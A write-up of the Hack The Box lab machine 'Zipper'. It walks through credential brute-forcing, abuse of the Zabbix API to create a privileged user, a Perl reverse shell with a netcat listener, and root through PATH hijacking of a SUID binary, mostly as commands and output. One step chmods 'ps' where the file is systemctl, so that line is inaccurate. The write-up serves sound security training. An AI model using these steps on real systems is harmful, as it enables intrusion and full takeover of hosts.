# Zipper 

This is a write up on the HTB machine, Zipper. I have seen a few different methods people used to obtain the initial user as well as root but this is the method I used. This is so far my favorite HTB box of all time.


## Enumeration
The IP given is `10.10.10.108`

We start by doing a nmap scan on the IP address:
 ```
[root:~]# nmap -sV -p- -v 10.10.10.108     
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
10050/tcp open  tcpwrapped syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 From here, the two major ports to enumerate is `10050` and `80`. Starting at `10050`, it seems that nmap's service enumeration did not find much information on the port.
 By doing a quick Google search, we are able to get a general idea of what the port is used for, which is `Zabbix-Agent`:
 https://www.speedguide.net/port.php?port=10050
 
 Next, we look at the HTTP service. On the default page of the web server, it is a default Apache2 Ubuntu page.
 Trying to brute force the directory using default Dirb wordlist and seclist's `big.txt` resulted in nothing significant. By using     the information we have gotten on `10050`, the directory `http://10.10.10.108/zabbix` was attempted and a login page was found: 
 
 ![Image](https://i.imgur.com/G7IOBIR.png)

 Default credentials were attempted on the login pannel, however, none of them were valid. 
 We are able to login as a "guest" user. Using CewL, a wordlist was created.
 ```
 [root:~]# cewl http://10.10.10.108/zabbix/zabbix.php\?action\=dashboard.view -H cookie:PHPSESSID=8b2a9bpfd5bvf5jk9s8lqfq9rl -m 5 -d 4 > zabbixwordlist.txt
```
To explain this syntax, we are able to pass a cookie in the header field so CewL scrapes words as the user "guest". The cookie was found by intercepting using Burp when logging in via "guest":
![Image](https://i.gyazo.com/0fcc5ac903ffefe902e1a88f45926c1b.png)

In a more time effiecnt approach, we are able to make a wordlist ourselves by finding potential words in the application. This makes a smaller wordlist to brute force:
```
zipper
Zipper
admin
Admin
Zabbix
zabbix
Zapper
zapper
password
Password
Administrator
administrator
root
Root
toor
Toor
```

 ## Exploitation
Using a brute forcing application, we find that the username and password credentials are `zapper:zapper` or `Zapper:Zapper`.
We try to login to the GUI pannel, however, we get a `GUI access disabled`.

From here, we do some research on Zabbix application itself. We see that in the documentation, Zabbix uses an API.
Zabbix API documentation: https://www.zabbix.com/documentation/3.0/manual/api

We can try authenticating and accessing the application using the API.
We start by getting the authentication token by sending a HTTP POST request to the API using curl:
```
curl -d '{
    "jsonrpc": "2.0",
    "method": "user.login",
    "params": {
        "user": "zapper",
        "password": "zapper"
    },
    "id": 1,
    "auth": null
}' -H "Content-Type: application/json" -X POST http://10.10.10.108/zabbix/api_jsonrpc.php 

Result: {"jsonrpc":"2.0","result":"36a3bf6f1edbd8275e3b5667b64fb128","id":1}
```

From here we would want to try to make a higher privledge account, but first we need to enumerate the user groups:
```
[root:~]# curl -d '{
    "jsonrpc": "2.0",
    "method": "usergroup.get",
    "params": {
        "output": "extend",
        "status": 0
    },
    "auth": "36a3bf6f1edbd8275e3b5667b64fb128",
    "id": 1
 }' -H "Content-Type: application/json" -X POST http://10.10.10.108/zabbix/api_jsonrpc.php 

Result: {"jsonrpc":"2.0","result":[{"usrgrpid":"7","name":"Zabbix administrators","gui_access":"0","users_status":"0","debug_mode":"0"},{"usrgrpid":"8","name":"Guests","gui_access":"0","users_status":"0","debug_mode":"0"},{"usrgrpid":"11","name":"Enabled debug mode","gui_access":"0","users_status":"0","debug_mode":"1"},{"usrgrpid":"12","name":"No access to the frontend","gui_access":"2","users_status":"0","debug_mode":"0"}],"id":1}
```

Lets create a debugging mode account:
```
curl -d '{
    "jsonrpc": "2.0",
    "method": "user.create",
    "params": {
        "alias": "John2",
        "passwd": "Doe123",
	"type": "3",
        "usrgrps": [
            {
                "usrgrpid": "11"
            }
        ],
        "user_medias": [
            {
                "mediatypeid": "1",
                "sendto": "support@company.com",
                "active": 0,
                "severity": 63,
                "period": "1-7,00:00-24:00"
            }
        ]
    },
    "auth": "36a3bf6f1edbd8275e3b5667b64fb128",
    "id": 1
}' -H "Content-Type: application/json" -X POST http://10.10.10.108/zabbix/api_jsonrpc.php 
```
After the user is created, we are able to login via GUI. We now have access to the "Administration" tab. We are able to create scripts `Administration -> Scripts` and execute them in the Zabbix agent. The Zabbix server is the container.
By doing some enumeration on the machine using the script function, we find that the machine has Perl installed. Using Perl, we can create a reverse shell:

![Image](https://i.gyazo.com/d372e0fb1099b2875399b6ae1e6ac527.png)

We set up a listener on our attacking machine:
`[root:~]# nc -nvlp 1234`

Then we login as a "guest" and execute the script on Zipper:
![Image](https://i.gyazo.com/fb40cffa499fb2a4adc1d6927d0a0f88.png)

# Privledge Escalation (User)
We are now a very low privledged user, authenticated as the Zabbix service:
```
$ whoami
zabbix
```

Searching around the machine, we find a backup script:
```
$ cd /home/zapper/utils
$ ls
backup.sh
zabbix-service
$ cat backup.sh 
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
```

The zip file is using a password `ZippityDoDah`.
We can try to authenticate to a user using the password we have found, but first we need to spawn a tty shell as we are getting `su: must be run from a terminal` by using the command `su`. By enumerating the machine more, we see that python3 is available so we use it to spawn a tty shell:
`python3 -c 'import pty; pty.spawn("/bin/sh")'`

Viewing the `/etc/passwd` shows a user `zapper` and we are able to authenticate to the user by using the password we have found: `su zapper: ZippityDoDah`:
![Image](https://i.gyazo.com/aed65e3fb0ecaa12d31394138356afbe.png)

# Privledge Escalation (Root)
Now we have user, it is time to move on to Root. Doing basic enumeration on the machine, such as using a privledge escalation script (https://www.rebootuser.com/?p=1758), we see something that is interesting with the SUID files:
```
[-] SUID files:
-rwsr-sr-x 1 root root 7556 Sep  8 13:05 /home/zapper/utils/zabbix-service
-rwsr-xr-x 1 root root 161520 Nov 30  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26012 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 30112 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 63988 Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root root 43240 Jan 25  2018 /bin/su
-rwsr-xr-x 1 root root 42400 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 62024 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 43684 Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 78788 Jan 25  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 172120 Jan 17  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 39016 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 78340 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 13960 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 525884 Feb  9  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 46436 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
```

In the `/home/zapper/utils` directory before, we see the `zabbix-service` file. So how can we elevate privledges with this file?
Lets figure out what this file does...

By running the file we see that we are able to 'stop' or 'start' the Zabbix service. From this we can assume that it uses some sort of system binary. By cat the file, we find that the file is using `systemctl`:
```
cat zabbix-service
... startsystemctl daemon-reload && systemctl start zabbix-agentstopsystemctl ... 
```

We can escalate to Root by changing the path variable and creating a file named `systemctl` which spawns a shell:
```
cd /tmp
echo "/bin/bash" > systemctl
chmod 777 ps
export PATH=/tmp:$PATH
```

Then we run the `zabbix-service` and `start` the service to trigger `systemctl`:
```cd /home/zapper/utils
./zabbix-service
start or stop?: start
```

And we are root:

![Image](https://i.gyazo.com/ba7592ed784591b356c81ef85836560a.png)

